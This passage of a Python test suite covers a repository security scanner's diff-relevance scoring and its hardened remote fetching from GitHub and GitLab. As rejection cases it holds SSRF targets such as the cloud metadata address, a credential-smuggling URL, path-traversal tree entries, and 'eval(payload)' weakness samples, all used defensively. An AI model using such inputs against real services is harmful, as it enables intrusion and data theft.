        self.assertEqual(result["findings"], [])

    def test_pre_existing_weakness_near_changed_guard_remains_visible(self):
        self.init(
            "def handler(payload, allowed):\n    if allowed:\n        return eval(payload)\n"
        )
        self.write(
            "app.py",
            "def handler(payload, allowed):\n    if allowed or payload:\n        return eval(payload)\n",
        )
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "high")
        self.assertEqual(result["finding_changes"], {"pre_existing": 1})

    def test_executable_permission_change_is_not_a_noop(self):
        self.init("print(1)\n")
        (self.repo / "app.py").chmod(0o755)
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "high")
        self.assertIn("REL-EXECUTABLE-MODE", {row["rule"] for row in result["signals"]})

    def test_unexamined_binary_prevents_low_relevance(self):
        self.init()
        self.write("README.md", "An example.\n")
        (self.repo / "asset.png").write_bytes(b"\x89PNG\0")
        result = self.invoke("--worktree")[1]
        self.assertEqual(result["relevance"], "unclear")
        self.assertIn("asset.png", result["coverage"]["unclassified_files"])

    def test_new_document_context_does_not_follow_links(self):
        self.init()
        outside = self.root / "private.md"
        outside.write_text("PRIVATE_CONTEXT_MARKER")
        (self.repo / "README.md").symlink_to(outside)
        status, result, errors = self.invoke("--worktree")
        self.assertEqual(status, 1)
        self.assertIsNone(result)
        self.assertNotIn("PRIVATE_CONTEXT_MARKER", errors)

    def test_change_text_output_is_relevance_not_a_grade(self):
        self.init("def view(user):\n    return user.name\n")
        self.write("app.py", "@login_required\ndef view(user):\n    return user.name\n")
        for extra in ([], ["--details"]):
            output = io.StringIO()
            with (
                contextlib.redirect_stdout(output),
                contextlib.redirect_stderr(io.StringIO()),
            ):
                status = cli.main([str(self.repo), "--worktree", *extra])
            self.assertEqual(status, 0)
            self.assertTrue(output.getvalue().startswith("Security relevance: high"))
            self.assertNotIn("/100", output.getvalue())
            self.assertNotIn("grade", output.getvalue())
            if extra:
                self.assertIn("REL-AUTH", output.getvalue())
                self.assertIn("Comparison:", output.getvalue())

    def test_signal_limit_keeps_evidence_for_a_later_stronger_level(self):
        after = {
            f"guide-{number:04d}.md": {"text": "Authentication guidance changed.\n"}
            for number in range(1001)
        }
        after["z.py"] = {"text": "token = supplied\n"}
        result = relevance.analyze({}, after, [], [], [], sources.Budget())
        self.assertEqual(result["relevance"], "high")
        self.assertTrue(result["coverage"]["signals_truncated"])
        self.assertEqual(len(result["signals"]), 1000)
        self.assertTrue(any(row["level"] == "high" for row in result["signals"]))


class RemoteTests(unittest.TestCase):
    def test_slow_headers_and_bodies_cannot_outlive_the_request_budget(self):
        for slow_part in ("headers", "body"):
            with self.subTest(slow_part=slow_part):
                client, server = socket.socketpair()
                connection = remote.http.client.HTTPConnection("api.github.com")
                connection.sock = client
                stop = threading.Event()

                def trickle():
                    try:
                        initial = (
                            b"HTTP/1.1 200 OK\r\nX-Test: "
                            if slow_part == "headers"
                            else b"HTTP/1.1 200 OK\r\nContent-Length: 100000\r\n\r\n"
                        )
                        server.sendall(initial)
                        while not stop.wait(0.005):
                            server.sendall(b"x")
                    except OSError:
                        pass

                sender = threading.Thread(target=trickle, daemon=True)
                sender.start()
                started = time.monotonic()
                try:
                    with self.assertRaises(sources.BudgetExceeded):
                        remote.get(
                            "https://api.github.com/repos/example/project",
                            sources.Budget(0.15),
                            connections={"api.github.com": connection},
                        )
                    self.assertLess(time.monotonic() - started, 2)
                finally:
                    stop.set()
                    connection.close()
                    server.close()
                    sender.join(timeout=1)
                self.assertFalse(sender.is_alive())

    def test_unreachable_first_address_falls_back_to_another_checked_address(self):
        bad, good, connection = mock.Mock(), mock.Mock(), mock.Mock()
        bad.connect.side_effect = OSError("SYNTHETIC_PRIVATE_DIAGNOSTIC")
        response = mock.Mock(status=200)
        response.getheader.return_value = "2"
        response.read.side_effect = [b"{}", b""]
        connection.getresponse.return_value = response
        with (
            mock.patch.object(
                remote,
                "public_addresses",
                return_value=[
                    (socket.AF_INET6, 1, 6, "", ("2001:4860:4860::8888", 443, 0, 0)),
                    (socket.AF_INET, 1, 6, "", ("8.8.8.8", 443)),
                ],
            ),
            mock.patch.object(remote.socket, "socket", side_effect=[bad, good]),
            mock.patch.object(
                remote.http.client, "HTTPSConnection", return_value=connection
            ),
        ):
            self.assertEqual(
                remote.get(
                    "https://api.github.com/repos/example/project", sources.Budget()
                ),
                (b"{}", 200),
            )
        bad.close.assert_called()
        good.connect.assert_called_once_with(("8.8.8.8", 443))

    def test_optional_metadata_failures_remain_unknown_without_blocking_sources(self):
        for failure in (sources.BudgetExceeded, sources.SourceError):
            with (
                self.subTest(failure=failure),
                mock.patch.object(
                    remote, "get", side_effect=failure("SYNTHETIC_PRIVATE_DIAGNOSTIC")
                ),
            ):
                document, reason = remote.json_get(
                    "https://api.github.com/repos/example/project",
                    sources.Budget(),
                    None,
                    "api.github.com",
                )
                self.assertEqual(document, {})
                self.assertNotIn("SYNTHETIC_PRIVATE_DIAGNOSTIC", reason)
                with self.assertRaises(failure):
                    remote.json_get(
                        "https://api.github.com/repos/example/project",
                        sources.Budget(),
                        None,
                        "api.github.com",
                        required=True,
                    )

    def test_optional_deep_json_and_wrong_setting_types_remain_unknown(self):
        with mock.patch.object(
            remote, "get", return_value=(b"[" * 1200 + b"]" * 1200, 200)
        ):
            self.assertEqual(
                remote.json_get(
                    "https://api.github.com/repos/example/project",
                    sources.Budget(),
                    None,
                    "api.github.com",
                ),
                ({}, "invalid API response"),
            )
        with mock.patch.object(
            remote,
            "json_get",
            side_effect=[
                ({"security_and_analysis": {"secret_scanning": {"status": []}}}, None),
            ],
        ):
            settings, _ = remote.host_settings(
                "github.com", "example/project", sources.Budget()
            )
        self.assertTrue(all(row["status"] == "unknown" for row in settings))

    def test_invalid_commit_ids_are_rejected_before_source_requests(self):
        for revision in ([], "../main", "a" * 41, "a" * 40 + "?path=other", 123):
            with (
                self.subTest(revision=revision),
                mock.patch.object(remote, "host_settings", return_value=([], revision)),
                mock.patch.object(remote, "get") as get,
                contextlib.redirect_stdout(io.StringIO()) as output,
                contextlib.redirect_stderr(io.StringIO()) as errors,
            ):
                status = cli.main(["https://github.com/example/project", "--json"])
            self.assertEqual(status, 1)
            self.assertEqual(output.getvalue(), "")
            self.assertIn("invalid commit ID", errors.getvalue())
            get.assert_not_called()

    def test_unknown_source_sizes_stop_downloads_at_the_aggregate_limit(self):
        entries = [
            {"path": f"app-{i}.py", "id": "b" * 40, "type": "blob", "mode": "100644"}
            for i in range(10)
        ]
        read = mock.Mock(side_effect=[json.dumps(entries).encode(), b"abc"])
        with (
            mock.patch.object(remote_sources, "MAX_BYTES", 3),
            mock.patch.object(remote_sources, "MAX_PARALLEL", 1),
        ):
            files, exclusions = remote_sources.select_files(
                "gitlab.com", "group/project", "a" * 40, sources.Budget(), read
            )
        self.assertEqual(list(files), ["app-0.py"])
        self.assertEqual(read.call_count, 2)
        self.assertEqual(len(exclusions), 9)
        self.assertTrue(all(row["reason"] == "source byte limit" for row in exclusions))

    def test_download_http_status_is_available_in_details_without_response_bodies(self):
        source = b"eval(payload)\n"
        for status_code in (401, 403, 404, 429, 500):
            with (
                self.subTest(status_code=status_code),
                mock.patch.object(remote_sources, "MAX_PARALLEL", 1),
                mock.patch.object(remote, "host_settings", return_value=([], "a" * 40)),
                mock.patch.object(
                    remote,
                    "get",
                    side_effect=[
                        (
                            self.listing(
                                [
                                    self.entry(size=len(source)),
                                    self.entry("z.py", size=1),
                                ]
                            ),
                            200,
                        ),
                        (source, 200),
                        (None, status_code),
                    ],
                ),
                contextlib.redirect_stdout(io.StringIO()) as output,
                contextlib.redirect_stderr(io.StringIO()),
            ):
                status = cli.main(["https://github.com/example/project", "--details"])
            self.assertEqual(status, 1)
            self.assertIn(
                f"source download failed (HTTP {status_code}): z.py", output.getvalue()
            )
            self.assertIn("59/100 (partial)", output.getvalue())

    def test_default_budget_and_download_reserve_leave_analysis_time(self):
        self.assertEqual(cli.parser().parse_args([]).timeout, 60)
        with mock.patch.object(sources.time, "monotonic", return_value=100) as clock:
            overall = sources.Budget()
            downloads = overall.portion(0.7)
            clock.return_value = 143
            with self.assertRaises(sources.BudgetExceeded):
                downloads.check()
            overall.check()
            self.assertEqual(overall.remaining(), 17)

    def test_deadline_retains_completed_requests_and_marks_unfetched_files(self):
        budget = sources.Budget()
        entries = [self.entry(f"app-{i}.py", size=1) for i in range(3)]
        read = mock.Mock(side_effect=[self.listing(entries), b"x", b"x"])

        def expire(pending, **kwargs):
            for future in pending:
                future.result(timeout=2)
            budget.deadline = 0
            return set(), set(pending)

        with (
            mock.patch.object(remote_sources, "MAX_PARALLEL", 2),
            mock.patch.object(remote_sources, "wait", side_effect=expire),
        ):
            files, exclusions = remote_sources.select_files(
                "github.com", "example/project", "a" * 40, budget, read
            )
        self.assertEqual(list(files), ["app-0.py", "app-1.py"])
        self.assertEqual(
            exclusions, [{"file": "app-2.py", "reason": "source time budget"}]
        )
        self.assertEqual(read.call_count, 3)

    def test_remote_time_and_download_failures_preserve_cli_indication(self):
        source = b"eval(payload)\n"
        entries = [self.entry(size=len(source)), self.entry("z.py", size=1)]
        for failure in (sources.BudgetExceeded, sources.SourceError):
            for flags in (["--json"], ["--quiet"], ["--detail"], []):
                with self.subTest(failure=failure, flags=flags):
                    output, errors = io.StringIO(), io.StringIO()

                    def fetch(url, budget, **kwargs):
                        if "/git/trees/" in url:
                            return self.listing(entries), 200
                        if url.endswith("/app.py"):
                            return source, 200
                        if failure is sources.BudgetExceeded:
                            budget.deadline = 0
                        raise failure("SYNTHETIC_PRIVATE_DIAGNOSTIC")

                    with (
                        mock.patch.object(
                            remote, "host_settings", return_value=([], "a" * 40)
                        ),
                        mock.patch.object(remote, "get", side_effect=fetch),
                        mock.patch.object(remote_sources, "MAX_PARALLEL", 1),
                        contextlib.redirect_stdout(output),
                        contextlib.redirect_stderr(errors),
                    ):
                        status = cli.main(
                            ["https://github.com/example/project", *flags]
                        )
                    self.assertEqual(status, 1)
                    self.assertNotIn(
                        "SYNTHETIC_PRIVATE_DIAGNOSTIC",
                        output.getvalue() + errors.getvalue(),
                    )
                    reason = (
                        "source time budget"
                        if failure is sources.BudgetExceeded
                        else "source download failed"
                    )
                    if flags == ["--json"]:
                        result = json.loads(output.getvalue())
                        self.assertEqual(result["observed_score"], 59)
                        self.assertEqual(result["verdict"], "incomplete")
                        self.assertIsNone(result["score"])
                        self.assertIsNone(result["grade"])
                        self.assertEqual(result["coverage"]["files_downloaded"], 1)
                        self.assertEqual(result["coverage"]["files_checked"], 1)
                        self.assertEqual(
                            result["coverage"]["selection_limits"], {reason: 1}
                        )
                    elif flags == ["--quiet"]:
                        self.assertEqual(output.getvalue(), "59\n")
                        self.assertEqual(errors.getvalue(), "")
                    elif flags == ["--detail"]:
                        self.assertRegex(
                            output.getvalue(), r"(?m)^Architecture\s+59/100"
                        )
                        self.assertIn("59/100 (partial)", output.getvalue())
                        self.assertIn(reason, output.getvalue())
                    else:
                        self.assertEqual(output.getvalue(), "59/100 (partial)\n")
                        self.assertIn("Reading selected sources...", errors.getvalue())

    def test_truncated_tree_yields_an_explicitly_incomplete_indication(self):
        source = b"eval(payload)\n"
        with (
            mock.patch.object(remote, "host_settings", return_value=([], "a" * 40)),
            mock.patch.object(
                remote,
                "get",
                side_effect=[
                    (self.listing([self.entry(size=len(source))], truncated=True), 200),
                    (source, 200),
                ],
            ),
            contextlib.redirect_stdout(io.StringIO()) as output,
        ):
            status = cli.main(["https://github.com/example/project", "--json"])
        result = json.loads(output.getvalue())
        self.assertEqual(status, 1)
        self.assertEqual(result["observed_score"], 59)
        self.assertIsNone(result["grade"])
        self.assertEqual(
            result["coverage"]["selection_limits"], {"truncated repository listing": 1}
        )

    def test_gitlab_pagination_leaves_time_to_download_retained_sources(self):
        budget, listing_budget = sources.Budget(), sources.Budget()
        rows = [
            {"path": "app.py", "type": "blob", "mode": "100644", "id": "b" * 40},
            *[
                {"path": f"asset-{i}.bin", "type": "blob", "mode": "100644"}
                for i in range(99)
            ],
        ]

        def read(url, **kwargs):
            if "/repository/tree" in url:
                listing_budget.deadline = 0
                return json.dumps(rows).encode()
            return b"eval(payload)\n"

        with mock.patch.object(budget, "portion", return_value=listing_budget):
            files, exclusions = remote_sources.select_files(
                "gitlab.com", "group/project", "a" * 40, budget, read
            )
        self.assertEqual(list(files), ["app.py"])
        self.assertIn(
            {"file": "repository-tree", "reason": "source time budget"}, exclusions
        )
        self.assertGreater(budget.remaining(), 0)

    def test_download_priority_keeps_other_sources_eligible(self):
        paths = ["assets/a.js", "tests/a.py", "app.py", "package.json"]
        read = mock.Mock(
            side_effect=[
                self.listing([self.entry(path, size=1) for path in paths]),
                *([b"x"] * 4),
            ]
        )
        with mock.patch.object(remote_sources, "MAX_PARALLEL", 1):
            files, exclusions = remote_sources.select_files(
                "github.com", "example/project", "a" * 40, sources.Budget(), read
            )
        requested = [
            call.args[0].split("/" + "a" * 40 + "/")[1]
            for call in read.call_args_list[1:]
        ]
        self.assertEqual(
            requested, ["package.json", "app.py", "tests/a.py", "assets/a.js"]
        )
        self.assertEqual(set(files), set(paths))
        self.assertEqual(exclusions, [])

    def test_source_http_limits_bound_headers_and_streamed_data(self):
        for length, chunks, succeeds in (
            ("6", [], False),
            ("²", [], False),
            ("", [], False),
            ("9" * 5000, [], False),
            (None, [b"123456"], False),
            ("5", [b"12345", b""], True),
        ):
            connection = mock.Mock()
            response = mock.Mock(status=200)
            response.getheader.return_value = length
            response.read.side_effect = chunks
            connection.getresponse.return_value = response
            with (
                self.subTest(length=length, succeeds=succeeds),
                mock.patch.object(
                    remote,
                    "public_addresses",
                    return_value=[(2, 1, 6, "", ("8.8.8.8", 443))],
                ),
                mock.patch.object(
                    remote.http.client, "HTTPSConnection", return_value=connection
                ),
                mock.patch.object(remote.socket, "socket", return_value=mock.Mock()),
            ):
                if succeeds:
                    self.assertEqual(
                        remote.get(
                            "https://api.github.com/repos/example/project",
                            sources.Budget(),
                            limit=5,
                        ),
                        (b"12345", 200),
                    )
                else:
                    with self.assertRaisesRegex(
                        sources.SourceError, "5-byte download limit"
                    ):
                        remote.get(
                            "https://api.github.com/repos/example/project",
                            sources.Budget(),
                            limit=5,
                        )
                connection.close.assert_called_once()

    def test_truncated_http_body_is_rejected_instead_of_scanned(self):
        connection = mock.Mock()
        response = mock.Mock(status=200)
        response.getheader.return_value = "5"
        response.read.side_effect = [b"12", b""]
        connection.getresponse.return_value = response
        cache = {"api.github.com": connection}
        with self.assertRaisesRegex(sources.SourceError, "before its declared length"):
            remote.get(
                "https://api.github.com/repos/example/project",
                sources.Budget(),
                connections=cache,
            )
        self.assertEqual(cache, {})
        connection.close.assert_called_once()

    def test_interrupted_request_never_returns_partial_bytes_or_reuses_its_socket(self):
        connection = mock.Mock()
        response = mock.Mock(status=200)
        response.getheader.return_value = None
        response.read.side_effect = [b"partial", b""]
        connection.getresponse.return_value = response
        cache = {"api.github.com": connection}
        with mock.patch.object(remote.threading, "Timer") as timer:

            def expire():
                _, callback, args = timer.call_args.args
                callback(*args)

            timer.return_value.start.side_effect = expire
            self.assertEqual(
                remote.get(
                    "https://api.github.com/repos/example/project",
                    sources.Budget(),
                    connections=cache,
                ),
                (None, 0),
            )
        self.assertEqual(cache, {})
        connection.close.assert_called_once()

    def test_connection_reuse_preserves_checked_destination_and_closes_on_failure(self):
        connection = mock.Mock()
        response = mock.Mock(status=200)
        response.getheader.return_value = None
        response.read.side_effect = [b"first", b"", b"second", b""]
        connection.getresponse.return_value = response
        cache = {}
        with (
            mock.patch.object(
                remote,
                "public_addresses",
                return_value=[(2, 1, 6, "", ("8.8.8.8", 443))],
            ) as addresses,
            mock.patch.object(
                remote.http.client, "HTTPSConnection", return_value=connection
            ) as connect,
            mock.patch.object(remote.socket, "socket", return_value=mock.Mock()),
        ):
            for expected in (b"first", b"second"):
                self.assertEqual(
                    remote.get(
                        "https://api.github.com/repos/example/project",
                        sources.Budget(),
                        connections=cache,
                    ),
                    (expected, 200),
                )
            self.assertEqual(addresses.call_count, 1)
            self.assertEqual(connect.call_count, 1)
            connection.close.assert_not_called()
            connection.request.side_effect = OSError("SYNTHETIC_PRIVATE_DIAGNOSTIC")
            self.assertEqual(
                remote.get(
                    "https://api.github.com/repos/example/project",
                    sources.Budget(),
                    connections=cache,
                ),
                (None, 0),
            )
            self.assertEqual(cache, {})
            connection.close.assert_called_once()

    def test_parallel_downloads_are_bounded_and_results_are_sorted(self):
        entries = [
            self.entry(f"app-{i:02}.py", size=1)
            for i in range(2 * remote_sources.MAX_PARALLEL)
        ]
        barrier = threading.Barrier(remote_sources.MAX_PARALLEL)
        lock = threading.Lock()
        active, peak = 0, 0

        def read(url, **kwargs):
            nonlocal active, peak
            if "/git/trees/" in url:
                return self.listing(entries)
            with lock:
                active += 1
                peak = max(peak, active)
            try:
                barrier.wait(timeout=2)
                return b"x"
            finally:
                with lock:
                    active -= 1

        files, _ = remote_sources.select_files(
            "github.com", "example/project", "a" * 40, sources.Budget(), read
        )
        self.assertEqual(peak, remote_sources.MAX_PARALLEL)
        self.assertEqual(list(files), sorted(row["path"] for row in entries))

    def test_gitlab_metadata_limit_applies_across_all_pages(self):
        first = json.dumps([{"path": f"app-{i}.bin"} for i in range(100)]).encode()
        read = mock.Mock(side_effect=[first, b"[]"])
        with mock.patch.object(remote_sources, "MAX_INDEX", len(first) + 1):
            with self.assertRaisesRegex(sources.SourceError, "metadata limit"):
                remote_sources.tree_entries(
                    "gitlab.com", "group/project", "a" * 40, sources.Budget(), read
                )
        self.assertEqual(read.call_args.kwargs["limit"], 1)

    @staticmethod
    def entry(path="app.py", *, size=28, oid="b" * 40, mode="100644", kind="blob"):
        return {"path": path, "size": size, "sha": oid, "mode": mode, "type": kind}

    @staticmethod
    def listing(entries, *, truncated=False):
        return json.dumps({"tree": entries, "truncated": truncated}).encode()

    def test_only_explicit_canonical_supported_git_urls(self):
        self.assertEqual(
            remote.repository_url("https://github.com/example/project.git"),
            ("github.com", "example/project"),
        )
        self.assertEqual(
            remote.repository_url("https://gitlab.com/group/team/project"),
            ("gitlab.com", "group/team/project"),
        )
        for url in (
            "http://github.com/example/project",
            "https://github.com@127.0.0.1/example/project",
            "https://github.com/example/../project",
            "https://github.com/example/project?token=hidden",
            "https://github.com:444/example/project",
        ):
            with self.subTest(url=url), self.assertRaises(sources.SourceError):
                remote.repository_url(url)

    def test_private_metadata_and_mapped_ipv6_destinations_are_rejected(self):
        for address in (
            "127.0.0.1",
            "169.254.169.254",
            "10.0.0.1",
            "::1",
            "::ffff:127.0.0.1",
        ):
            with (
                self.subTest(address=address),
                mock.patch.object(
                    remote.socket,
                    "getaddrinfo",
                    return_value=[(2, 1, 6, "", (address, 443))],
                ),
            ):
                with self.assertRaises(sources.SourceError):
                    remote.public_addresses("github.com", sources.Budget())

    def test_http_connect_uses_checked_ip_and_keeps_tls_hostname(self):
        connection = mock.Mock()
        context = mock.Mock()
        connection._context = context
        response = mock.Mock(status=200)
        response.getheader.return_value = None
        response.read.side_effect = [b"{}", b""]
        connection.getresponse.return_value = response
        raw_socket = mock.Mock()
        with (
            mock.patch.object(
                remote,
                "public_addresses",
                return_value=[(2, 1, 6, "", ("8.8.8.8", 443))],
            ),
            mock.patch.object(
                remote.http.client, "HTTPSConnection", return_value=connection
            ),
            mock.patch.object(remote.socket, "socket", return_value=raw_socket),
        ):
            value, status = remote.get(
                "https://api.github.com/repos/example/project", sources.Budget()
            )
        self.assertEqual((value, status), (b"{}", 200))
        raw_socket.connect.assert_called_once_with(("8.8.8.8", 443))
        context.wrap_socket.assert_called_once_with(
            raw_socket, server_hostname="api.github.com"
        )

    def test_source_redirects_are_rejected_without_following_them(self):
        connection = mock.Mock()
        response = mock.Mock(status=302)
        response.getheader.return_value = (
            "https://raw.githubusercontent.com/example/project/app.py"
        )
        connection.getresponse.return_value = response
        with (
            mock.patch.object(
                remote,
                "public_addresses",
                return_value=[(2, 1, 6, "", ("8.8.8.8", 443))],
            ),
            mock.patch.object(
                remote.http.client, "HTTPSConnection", return_value=connection
            ) as connect,
            mock.patch.object(remote.socket, "socket", return_value=mock.Mock()),
        ):
            with self.assertRaisesRegex(
                sources.SourceError, "redirects are not followed"
            ):
                remote.get(
                    "https://api.github.com/repos/example/project",
                    sources.Budget(),
                    token="isolated-test-value",
                    token_host="api.github.com",
                )
        self.assertEqual(connect.call_count, 1)
        response.read.assert_not_called()

    def test_api_credentials_are_not_forwarded_to_public_source_host(self):
        connection = mock.Mock()
        response = mock.Mock(status=200)
        response.getheader.return_value = None
        response.read.side_effect = [b"x", b""]
        connection.getresponse.return_value = response
        with (
            mock.patch.object(
                remote,
                "public_addresses",
                return_value=[(2, 1, 6, "", ("8.8.8.8", 443))],
            ),
            mock.patch.object(
                remote.http.client, "HTTPSConnection", return_value=connection
            ),
            mock.patch.object(remote.socket, "socket", return_value=mock.Mock()),
        ):
            remote.get(
                "https://raw.githubusercontent.com/example/project/"
                + "a" * 40
                + "/app.py",
                sources.Budget(),
                token="isolated-test-value",
                token_host="api.github.com",
            )
        headers = connection.request.call_args.kwargs["headers"]
        self.assertNotIn("Authorization", headers)
        self.assertNotIn("PRIVATE-TOKEN", headers)

    def test_unreadable_host_settings_remain_unknown(self):
        with mock.patch.object(
            remote, "json_get", return_value=({}, "not readable (HTTP 403)")
        ):
            settings, revision = remote.host_settings(
                "github.com", "example/project", sources.Budget()
            )
        self.assertIsNone(revision)
        self.assertTrue(all(row["status"] == "unknown" for row in settings))
        findings, checks = remote.settings_checks(settings)
        self.assertEqual(findings, [])
        self.assertTrue(all(row["status"] == "unclear" for row in checks))

    def test_host_protection_and_reviews_have_explicit_evidence(self):
        responses = [
            ({"default_branch": "main"}, None),
            ({"protected": True, "commit": {"sha": "a" * 40}}, None),
            (
                {
                    "required_pull_request_reviews": {
                        "required_approving_review_count": 2
                    }
                },
                None,
            ),
            ([], None),
        ]
        with mock.patch.object(remote, "json_get", side_effect=responses):
            settings, revision = remote.host_settings(
                "github.com", "example/project", sources.Budget()
            )
        self.assertEqual([row["status"] for row in settings[:2]], ["set", "set"])
        self.assertEqual(revision, "a" * 40)

    def github_settings(self, branch, protection, rules):
        responses = [
            ({"default_branch": "release/1"}, None),
            (branch, None),
            *([protection] if branch.get("protected") is True else []),
            *([rules] if branch.get("protected") is True else []),
        ]
        with mock.patch.object(remote, "json_get", side_effect=responses) as get:
            settings, _ = remote.host_settings(
                "github.com", "example/project", sources.Budget()
            )
        return {row["setting"]: row["status"] for row in settings}, get

    def test_rulesets_establish_reviews_checks_and_signatures_without_admin_rights(
        self,
    ):
        branch = {"protected": True, "commit": {"sha": "a" * 40}}
        rules = [
            {
                "type": "pull_request",
                "parameters": {"required_approving_review_count": 1},
            },
            {"type": "required_status_checks", "parameters": {}},
            {"type": "required_signatures"},
            {"type": 7},
            "unexpected",
        ]
        settings, get = self.github_settings(
            branch, ({}, "not readable (HTTP 404)"), (rules, None)
        )
        self.assertEqual(settings["required_reviews"], "set")
        self.assertEqual(settings["successful_pipeline_before_merge"], "set")
        self.assertEqual(settings["signed_commits"], "set")
        url = get.call_args_list[-1].args[0]
        self.assertTrue(
            url.startswith(
                "https://api.github.com/repos/example/project/rules/branches/release%2F1"
            )
        )

    def test_ruleset_without_a_review_count_leaves_reviews_unknown(self):
        branch = {"protected": True, "commit": {"sha": "a" * 40}}
        for rules in (
            [{"type": "deletion"}],
            [
                {
                    "type": "pull_request",
                    "parameters": {"required_approving_review_count": 0},
                }
            ],
            [{"type": "pull_request", "parameters": "unexpected"}],
        ):
            with self.subTest(rules=rules):
                settings, _ = self.github_settings(
                    branch, ({}, "not readable (HTTP 404)"), (rules, None)
                )
                self.assertEqual(settings["required_reviews"], "unknown")
                self.assertEqual(settings["signed_commits"], "unknown")

    def test_failed_ruleset_request_stays_unknown(self):
        branch = {"protected": True, "commit": {"sha": "a" * 40}}
        settings, _ = self.github_settings(
            branch, ({}, "not readable (HTTP 404)"), ({}, "not readable (HTTP 403)")
        )
        self.assertEqual(settings["default_branch_protection"], "set")
        self.assertEqual(settings["required_reviews"], "unknown")

    def test_unprotected_branch_skips_the_ruleset_request(self):
        settings, get = self.github_settings(
            {"protected": False, "commit": {"sha": "a" * 40}}, None, None
        )
        self.assertEqual(settings["required_reviews"], "not_set")
        self.assertEqual(get.call_count, 2)

    def test_signed_commits_are_never_a_finding(self):
        findings, checks = remote.settings_checks(
            [{"setting": "signed_commits", "status": "unknown", "reason": "x"}]
        )
        self.assertEqual(findings, [])
        self.assertEqual(checks[0]["status"], "unclear")

    def test_gitlab_only_credits_reviews_for_the_selected_branch(self):
        project = {
            "default_branch": "main",
            "only_allow_merge_if_pipeline_succeeds": True,
        }
        branch = {"protected": True, "commit": {"id": "b" * 40}}
        rules = [
            {
                "approvals_required": 2,
                "protected_branches": [{"name": "main"}],
                "eligible_approvers": [{"name": "PRIVATE_PERSON_MARKER"}],
            }
        ]
        with mock.patch.object(
            remote,
            "json_get",
            side_effect=[(project, None), (branch, None), (rules, None)],
        ):
            settings, revision = remote.host_settings(
                "gitlab.com", "group/project", sources.Budget(), "isolated-test-value"
            )
        self.assertEqual(
            next(
                row["status"]
                for row in settings
                if row["setting"] == "required_reviews"
            ),
            "set",
        )
        self.assertNotIn("PRIVATE_PERSON_MARKER", json.dumps(settings))
        self.assertEqual(revision, "b" * 40)
        rules[0]["protected_branches"][0]["name"] = "other"
        with mock.patch.object(
            remote,
            "json_get",
            side_effect=[(project, None), (branch, None), (rules, None)],
        ):
            settings, _ = remote.host_settings(
                "gitlab.com", "group/project", sources.Budget(), "isolated-test-value"
            )
        self.assertEqual(
            next(
                row["status"]
                for row in settings
                if row["setting"] == "required_reviews"
            ),
            "unknown",
        )

    def test_url_runtime_reads_pinned_source_and_settings(self):
        source = b"requests.get(url, verify=True)\n"
        settings = [
            remote.setting("default_branch_protection", False),
            remote.setting("required_reviews", None),
        ]
        output = io.StringIO()
        with (
            mock.patch.object(
                remote, "host_settings", return_value=(settings, "a" * 40)
            ),
            mock.patch.object(
                remote,
                "get",
                side_effect=[
                    (self.listing([self.entry(size=len(source))]), 200),
                    (source, 200),
                ],
            ) as fetch,
            contextlib.redirect_stdout(output),
        ):
            status = cli.main(["https://github.com/example/project.git", "--json"])
        result = json.loads(output.getvalue())
        self.assertEqual(status, 0)
        self.assertEqual(result["scope"]["revision"], "a" * 40)
        self.assertEqual(result["scope"]["selection"], "git-url")
        self.assertEqual(result["host_settings"], settings)
        self.assertEqual(result["score"], 79)
        self.assertEqual(result["grade"], "C")
        self.assertEqual(
            fetch.call_args_list[0].args[0],
            "https://api.github.com/repos/example/project/git/trees/"
            + "a" * 40
            + "?recursive=1",
        )
        self.assertEqual(
            fetch.call_args_list[1].args[0],
            "https://raw.githubusercontent.com/example/project/" + "a" * 40 + "/app.py",
        )

    def test_host_controls_alone_cannot_award_a_source_score(self):
        output = io.StringIO()
        with (
            mock.patch.object(
                remote,
                "host_settings",
                return_value=(
                    [remote.setting("default_branch_protection", True)],
                    "a" * 40,
                ),
            ),
            mock.patch.object(
                remote,
                "get",
                return_value=(self.listing([self.entry("app.java")]), 200),
            ) as fetch,
            contextlib.redirect_stdout(output),
        ):
            status = cli.main(["https://github.com/example/project", "--json"])
        self.assertEqual(status, 2)
        result = json.loads(output.getvalue())
        self.assertIsNone(result["grade"])
        self.assertIsNone(result["observed_score"])
        self.assertEqual(fetch.call_count, 1)

    def test_selective_download_skips_large_assets_and_oversized_sources(self):
        source = b"eval(payload)\n"
        entries = [
            self.entry("asset.bin", size=100 * 1024 * 1024),
            self.entry("vendor/ignored.py", size=100 * 1024 * 1024),
            self.entry("large.js", size=sources.MAX_FILE + 1),
            self.entry(size=len(source)),
        ]
        read = mock.Mock(side_effect=[self.listing(entries), source])
        files, exclusions = remote_sources.select_files(
            "github.com", "example/project", "a" * 40, sources.Budget(), read
        )
        self.assertEqual(list(files), ["app.py"])
        self.assertEqual(read.call_count, 2)
        self.assertEqual(read.call_args.kwargs["limit"], sources.MAX_FILE)
        self.assertEqual(
            next(row["reason"] for row in exclusions if row["file"] == "large.js"),
            "oversized",
        )

    def test_remote_listing_rejects_unsafe_ambiguous_and_invalid_input(self):
        cases = [
            b'{"tree": [], "truncated": "false"}',
            self.listing([self.entry("../outside.py")]),
            self.listing([self.entry("/outside.py")]),
            self.listing([self.entry("C:\\outside.py")]),
            self.listing([self.entry(), self.entry()]),
            self.listing([self.entry(oid="../../outside")]),
            self.listing([self.entry(size=-1)]),
            self.listing([self.entry(mode="unknown")]),
            self.listing([self.entry(mode=[])]),
            self.listing([self.entry(kind="unknown")]),
            self.listing([self.entry(kind={})]),
            self.listing([None]),
            b"[]",
            b"invalid JSON",
        ]
        for listing in cases:
            with self.subTest(listing=listing[:160]):
                read = mock.Mock(return_value=listing)
                with self.assertRaises(sources.SourceError):
                    remote_sources.select_files(
                        "github.com",
                        "example/project",
                        "a" * 40,
                        sources.Budget(),
                        read,
                    )
                self.assertEqual(read.call_count, 1)

    def test_links_and_submodules_are_excluded_without_following_them(self):
        read = mock.Mock(
            return_value=self.listing(
                [
                    self.entry(mode="120000"),
                    self.entry("submodule", kind="commit", mode="160000"),
                ]
            )
        )
        files, exclusions = remote_sources.select_files(
            "github.com", "example/project", "a" * 40, sources.Budget(), read
        )
        self.assertEqual(files, {})
        self.assertEqual(
            [row["reason"] for row in exclusions], ["link or submodule"] * 2
        )
        self.assertEqual(read.call_count, 1)

    def test_remote_limits_retain_a_bounded_sample_before_downloading(self):
        for limit, value, entries, reason in (
            (
                "MAX_FILES",
                1,
                [self.entry(size=1), self.entry("other.py", size=1)],
                "repository entry limit",
            ),
            (
                "MAX_BYTES",
                1,
